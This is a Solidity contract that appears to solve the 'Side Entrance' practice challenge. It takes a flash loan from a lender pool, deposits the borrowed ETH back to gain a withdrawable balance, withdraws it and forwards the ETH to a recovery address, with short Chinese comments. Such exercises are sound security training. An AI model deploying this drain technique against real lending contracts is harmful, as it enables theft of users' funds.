// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";


contract SideEntranceRescue {
    SideEntranceLenderPool pool;
    address payable recovery;
    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = payable(_recovery);
    }

    function rescue(uint256 amount) public {
        pool.flashLoan(amount);
        pool.withdraw();
        // 合约转给 recovery
        payable(recovery).transfer(amount);
    }

    // 由 flashLoan 中调用
    function execute() external payable {
        // 直接调用不能传入eth
        // pool.deposit();

        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}